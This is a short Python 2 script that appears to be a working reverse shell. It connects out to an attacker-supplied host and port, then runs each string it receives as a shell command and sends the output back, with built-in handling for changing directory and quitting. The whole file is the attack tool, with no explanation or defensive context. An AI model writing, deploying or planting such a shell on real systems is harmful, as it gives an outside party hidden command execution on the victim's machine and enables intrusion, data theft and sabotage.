#!/usr/bin/python

import os,socket,sys
import subprocess


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))
s.send('''<<<Hey, Send me something, I'm ready =)\n>>''')

while 1:
    data = s.recv(2048)
    if "q" == data.lower().strip():
        s.close()
        break;
    else:
        if data.startswith('cd'):
            os.chdir(data[3:].strip())
            s.send("Moved to "+str(os.getcwd()))
            result='\n'
	    s.send(str(result)+'>>')
        else:
            result=subprocess.Popen(data, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True, close_fds = True)
            s.send(str(result.stdout.read())+">>")
exit()
